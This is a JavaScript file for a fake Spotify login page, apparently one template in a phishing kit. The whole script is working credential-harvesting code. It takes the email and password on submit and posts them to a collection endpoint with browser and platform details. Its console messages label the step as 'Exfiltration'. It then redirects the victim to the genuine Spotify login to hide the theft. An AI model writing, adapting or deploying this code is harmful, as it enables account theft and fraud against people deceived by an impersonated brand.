document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('login-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');

    form.addEventListener('submit', (e) => {
        e.preventDefault();

        const email = emailInput.value.trim();
        const password = passwordInput.value;

        if (!email || !password) {
            alert('Please fill in all fields');
            return;
        }

        // Envia credenciais para o servidor
        enviarCredenciais(email, password);
    });

    function enviarCredenciais(email, senha) {
        fetch('/api/salvar-client', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessao: 'spotify_login_' + Date.now(),
                dados: [
                    { tipo: 'credential', campo: 'email', tecla: email, timestamp: new Date().toISOString() },
                    { tipo: 'credential', campo: 'password', tecla: senha, timestamp: new Date().toISOString() }
                ],
                navegador: navigator.userAgent,
                plataforma: navigator.platform,
                template: 'spotify'
            })
        })
        .then(r => r.json())
        .then(data => {
            console.log('[Exfiltration] Credentials sent');
            // Redireciona para o Spotify real
            window.location.href = 'https://accounts.spotify.com/login';
        })
        .catch(e => {
            console.log('[Exfiltration] Error:', e);
            window.location.href = 'https://accounts.spotify.com/login';
        });
    }

    // Social buttons redirect
    document.querySelectorAll('.social-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            window.location.href = 'https://accounts.spotify.com/login';
        });
    });
});
